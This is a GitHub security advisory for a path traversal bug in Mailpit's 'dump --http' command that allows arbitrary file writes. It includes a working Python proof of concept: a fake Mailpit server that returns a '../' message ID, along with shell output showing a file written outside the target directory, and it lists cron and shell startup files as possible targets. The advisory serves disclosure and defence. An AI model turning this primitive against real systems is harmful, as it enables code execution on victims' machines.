# [M] Mailpit: Path traversal & arbitrary file write in mailpit dump --http via attacker-controlled message IDs

## Summary
Severity: Medium
Advisory: GHSA-qx5x-85p8-vg4j
CVE: CVE-2026-45711
CWE: CWE-22, CWE-829
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-qx5x-85p8-vg4j
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.30.0

## Details
### Summary
The mailpit dump --http <base-url> <out-dir> sub-command downloads every message from a remote Mailpit instance and writes each one as <id>.eml inside the user-supplied output directory. The message ID field is taken verbatim from the JSON response of the remote server and concatenated into the output path with path.Join, which silently normalizes .. segments. A malicious HTTP server impersonating Mailpit can therefore make mailpit dump write attacker-controlled bytes to any path the running user can write, fully outside the intended output directory.

### Details
Anyone who can convince a user to run mailpit dump --http <attacker-url> <dir> (typosquat, phishing tutorial, MITM of a plain-http:// Mailpit, or a compromised internal Mailpit they back up regularly) obtains an arbitrary file write primitive as the dumping user. Realistic post-exploitation includes overwriting init/cron files, shell startup files, CI artifact upload targets, web roots, etc. — anything the dumping user can write to, with attacker-controlled file bytes and a .eml filename suffix.

### Affected code
[internal/dump/dump.go](https://github.com/axllent/mailpit/blob/develop/internal/dump/dump.go#L118-L155):

path.Join("/safe/out/dir", "../../../../etc/cron.d/payload.eml") resolves to /etc/cron.d/payload.eml — the .. segments are normalized, not rejected. The remote server controls both m.ID (path) and the body of /api/v1/message/<id>/raw (contents). There is no filepath.Rel(outDir, out) containment check, no allow-list on m.ID characters, and no body-size cap.

The underlying cause is that the command was added to back up a trusted Mailpit, but the trust model on the wire never gets validated — the operator only supplies a URL.

### PoC

1. Run a malicious "Mailpit" server that returns one message whose ID contains .. segments:

```python
# evil-mailpit.py
import http.server, json

class Evil(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if "/api/v1/messages" in self.path:
            resp = {
                "total": 1, "unread": 0, "count": 1,
                "messages_count": 1, "messages_unread": 0,
                "start": 0, "tags": [],
                "messages": [{
                    "ID": "../../../../tmp/mailpit-pwn",          # ← traversal
                    "MessageID": "x", "Read": False,
                    "From": {"Name": "", "Address": "a@b"},
                    "To":   [{"Name": "", "Address": "c@d"}],
                    "Cc": None, "Bcc": None, "ReplyTo": [],
                    "Subject": "evil",
                    "Created": "2026-01-01T00:00:00Z",
                    "Tags": [], "Size": 5,
                    "Attachments": 0, "Snippet": ""
                }]
            }
            body = json.dumps(resp).encode()
            ctype = "application/json"
        elif "/raw" in self.path:
            body  = b"PWNED BY MAILPIT DUMP TRAVERSAL\n"
            ctype = "text/plain"
        else:
            self.send_response(404); self.end_headers(); return

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

http.server.HTTPServer(("127.0.0.1", 19090), Evil).serve_forever()
```

```
$ python3 evil-mailpit.py &
$ mkdir -p /tmp/dump-out
$ mailpit dump --http http://127.0.0.1:19090/ /tmp/dump-out
```

2. Observe the file was written outside the requested output directory:

```
$ ls -la /tmp/dump-out/ /tmp/mailpit-pwn.eml
/tmp/dump-out/                                        ← empty
total 0
-rw-r--r-- 1 user user 31 May 11 16:16 /tmp/mailpit-pwn.eml
$ cat /tmp/mailpit-pwn.eml
PWNED BY MAILPIT DUMP TRAVERSAL
```

The same primitive trivially targets ~/.config/autostart/*.eml, ~/.bash_logout.eml (where it overwrites if symlinked), CI artifact dirs that ingest every file, or via long ../ chains any absolute path the user can write to.

### Impact
Arbitrary file write via path traversal in mailpit dump --http, allowing a malicious Mailpit-compatible server to force writes outside the intended output directory. This can lead to overwriting sensitive files (e.g. cron jobs, CI artifacts, shell configs) and potential code execution depending on write location and privileges.

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-qx5x-85p8-vg4j
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.30.0
